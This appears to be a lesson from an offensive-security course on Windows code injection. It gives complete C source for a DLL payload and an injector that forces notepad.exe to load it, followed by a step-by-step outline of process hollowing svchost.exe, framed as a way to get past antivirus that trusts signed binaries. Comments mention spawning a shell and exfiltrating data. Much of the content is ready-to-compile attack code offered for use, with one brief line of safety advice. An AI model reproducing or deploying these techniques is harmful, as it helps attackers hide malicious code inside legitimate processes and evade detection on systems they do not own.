Module 10 of 22 — Running your code inside someone else's process

🧠 The Core Truth

Every process is a container. It has memory, threads, and permissions. Code injection is the act of opening someone else's container and putting your code inside. Once inside, your code runs with the container's identity — its permissions, its network access, its visibility to the OS. You become the process.

🎯 Soldier Translation

Imagine a courier delivering a package. The courier (legitimate process) has access to the building (system resources). You swap the package contents (inject code) without the courier knowing. The courier delivers your package, the recipient opens it, and your code executes — wearing the courier's uniform, using the courier's ID badge.

Method 1: DLL Injection (Classic)

Step 1: Build the Malicious DLL

A DLL is a library that can be loaded into any process. We build one that executes when loaded.

// inject_dll.c — Malicious DLL for injection // Compile: cl.exe /LD inject_dll.c /Fe:inject.dll #include // This function runs when the DLL is loaded BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) { if (reason == DLL_PROCESS_ATTACH) { // This code runs inside the target process! MessageBox(NULL, "Injected!", "Code Injection", MB_OK); // Real payload would spawn shell, exfiltrate, etc. // WinExec("cmd.exe /c whoami > C:\temp\injected.txt", 0); } return TRUE; }
Why DllMain?

Windows calls DllMain automatically when a DLL is loaded into a process. It's the entry point — like main() for EXEs. By putting our payload in DllMain, it executes immediately upon injection, without needing to call any exported functions.

Step 2: The Injector (The Delivery Mechanism)

This program finds a target process and forces it to load our DLL.

// injector.c — DLL injector // Compile: cl.exe injector.c /Fe:injector.exe #include #include #include // Find process by name DWORD find_process(const char* name) { HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(pe); if (Process32First(snap, &pe)) { do { if (_stricmp(pe.szExeFile, name) == 0) { CloseHandle(snap); return pe.th32ProcessID; // Found it! } } while (Process32Next(snap, &pe)); } CloseHandle(snap); return 0; } int main() { // Step 1: Find target process (e.g., notepad.exe) DWORD pid = find_process("notepad.exe"); if (!pid) { printf("Target not running. Start notepad.exe first.\n"); return 1; } printf("[+] Found notepad.exe PID: %lu\n", pid); // Step 2: Open target process with write permission HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!hProcess) { printf("[-] OpenProcess failed. Need higher privileges.\n"); return 1; } printf("[+] Opened process handle\n"); // Step 3: Allocate memory in target for DLL path char dllPath[] = "C:\\temp\\inject.dll"; LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (!remoteMem) { printf("[-] VirtualAllocEx failed\n"); return 1; } printf("[+] Allocated %zu bytes in target memory\n", strlen(dllPath) + 1); // Step 4: Write DLL path into target memory WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL); printf("[+] Wrote DLL path to target memory\n"); // Step 5: Create remote thread that loads the DLL // LoadLibraryA is in kernel32.dll — available in every process HMODULE hKernel32 = GetModuleHandle("kernel32.dll"); LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA"); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMem, 0, NULL); if (!hThread) { printf("[-] CreateRemoteThread failed\n"); return 1; } printf("[+] Remote thread created! DLL injected.\n"); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return 0; }
⚠️ Why this works

Windows allows one process to control another if you have the right permissions. OpenProcess with PROCESS_ALL_ACCESS gives you total control. VirtualAllocEx lets you allocate memory in the target's space. WriteProcessMemory lets you write to it. CreateRemoteThread lets you start execution. The target process never consented — Windows allowed it because the injector had permissions.

Method 2: Process Hollowing (Advanced)

The Stealth Injection

Instead of injecting into a running process, you create a suspended process, replace its entire memory with your code, then resume it. The process looks legitimate (signed binary) but runs your payload.

=== PROCESS HOLLOWING STEPS === 1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED, ...) # Process created but frozen. Memory contains real svchost.exe. 2. NtUnmapViewOfSection(hProcess, baseAddress) # Erase the original code. Memory is now empty. 3. VirtualAllocEx(hProcess, baseAddress, payloadSize, ...) # Allocate new space at the same address. 4. WriteProcessMemory(hProcess, baseAddress, payload, payloadSize, ...) # Write your malicious code into the hollowed process. 5. SetThreadContext(hThread, &context) # Point the main thread to your entry point. 6. ResumeThread(hThread) # Process wakes up. Task Manager shows "svchost.exe". # But it's running YOUR code. Signed binary, malicious soul.
Why process hollowing is stealthier

Task Manager shows "svchost.exe" — a signed Microsoft binary. Process Explorer shows it as legitimate. But the memory contains your code. AV that trusts signed binaries is fooled. Only memory scanners (like Windows Defender's real-time protection) can detect this — and even then, only if they scan at the right moment.

Key Takeaways

  • Code injection is a Windows feature: Debuggers use it. AV can't block it globally.
  • DLL injection is the simplest: Open → Allocate → Write → Execute. Four API calls.
  • Process hollowing is the stealthiest: Signed binary appearance, malicious memory content.
  • KAV doesn't see injection: It sees the result (new thread), not the act. Behavioral detection only.
  • Practice safely: Only inject into processes you own. System injection = blue screen or detection.
